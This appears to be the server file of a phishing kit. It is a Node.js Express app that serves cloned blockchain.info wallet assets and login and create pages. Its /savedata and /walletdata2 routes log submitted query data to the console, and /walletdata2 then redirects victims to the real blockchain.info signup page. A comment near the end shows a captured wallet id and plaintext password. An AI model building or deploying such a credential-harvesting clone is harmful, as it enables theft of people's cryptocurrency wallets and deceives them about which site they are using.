


var express = require("express");
var mailer  = require("./lib/express-mailer");

var app     = express();


app.use(express.static('./public'));

app.use(express.static(__dirname + '/public'));
//Store all HTML files in view folder.
app.use(express.static(__dirname + '/script'));
//Store all JS and CSS in Scripts folder.

app.set('views', __dirname + '/public/views');
app.engine('html', require('ejs').renderFile);
app.set('view engine', 'html');


app.get('/css', function(req, res){
  res.sendFile("public/wallet.css", { root: __dirname });
});


app.get('/js', function(req, res){
  res.sendFile("public/landing.min.js", { root: __dirname });
});

app.get('/img/5e7789165a66f1ca5cfd092214a4c541.png', function(req, res){
  res.sendFile("/img/5e7789165a66f1ca5cfd092214a4c541.png", { root: __dirname });
});
app.get('/img/blockchain-vector-f1208a2b904ce045df3239b1922104bd3fc6a7c1', function(req, res){
  res.sendFile('public/img/blockchain-vector-f1208a2b904ce045df3239b1922104bd3fc6a7c1.svg', { root: __dirname });
});

app.get('/img/landing-page-banner-overlay-6ac59d960bec914afcc616c94ae4070ac7e87481.jpg', function(req, res){
  res.sendFile("public/img/landing-page-banner-overlay-6ac59d960bec914afcc616c94ae4070ac7e87481.jpg", { root: __dirname });
});

app.get('/img/landing-page-banner-sm-overlay-91608c17613b646a85a3cac665e949422cbefe84.jpg', function(req, res){
  res.sendFile("public/img/landing-page-banner-sm-overlay-91608c17613b646a85a3cac665e949422cbefe84.jpg", { root: __dirname });
});

app.get('/img/bitcoin-network-35cf9306188c9bc7354c0528f079d997d6845d34.svg', function(req, res){
  res.sendFile("public/img/bitcoin-network-35cf9306188c9bc7354c0528f079d997d6845d34.svg", { root: __dirname });
});


app.get('/fonts/montserrat/Montserrat-Light.ttf', function(req, res){
  res.sendFile("public/fontes/Montserrat-Light.ttf", { root: __dirname });
});
app.get('/fonts/montserrat/Montserrat-ExtraLight.ttf', function(req, res){
  res.sendFile("public/fontes/Montserrat-ExtraLight.ttf", { root: __dirname });
});
app.get('/fonts/montserrat/Montserrat-Regular.ttf', function(req, res){
  res.sendFile("public/fontes/Montserrat-Regular.ttf", { root: __dirname });
});
app.get('/fonts/icomoon/icomoon.ttf', function(req, res){
  res.sendFile("public/fontes/icomoon.ttf", { root: __dirname });
});


/*app.get('/',function(req,res){
  //res.sendFile('99btc/index.html', { root: __dirname });
  //res.redirect("https://www.reddit.com/r/Bitcoin/comments/3fvoxm/a_list_of_block_explorers_more_than_10/");
  res.redirect("/pedidos");
  //It will find and locate index.html from View or Scripts
});*/

app.get('/',function(req,res){
  res.sendFile('pedidos.html', { root: __dirname });
  //It will find and locate index.html from View or Scripts
});


app.get('/login',function(req,res){
  res.sendFile('/login.html', { root: __dirname });
});

app.get('/create',function(req,res){
  res.sendFile('/create.html', { root: __dirname });
});

app.all('/savedata',function(req,res){

  var data = req.query;
  console.log(data);


  //res.redirect('/?msg');
  res.sendFile('pedidos2.html', { msg: true, root: __dirname });

  //res.sendFile('/create.html', { root: __dirname });
});

app.all('/walletdata2',function(req,res){

  var data = req.query;
  console.log(data);
  res.redirect('https://blockchain.info/wallet/#/signup');

  //res.sendFile('/create.html', { root: __dirname });
});



/*
 teste: 'teste',
  id: 'walletid12312312313',
  pass_input: 'SandroniDias09@' }
*/


app.listen(3005);

console.log("Running at Port 3005");
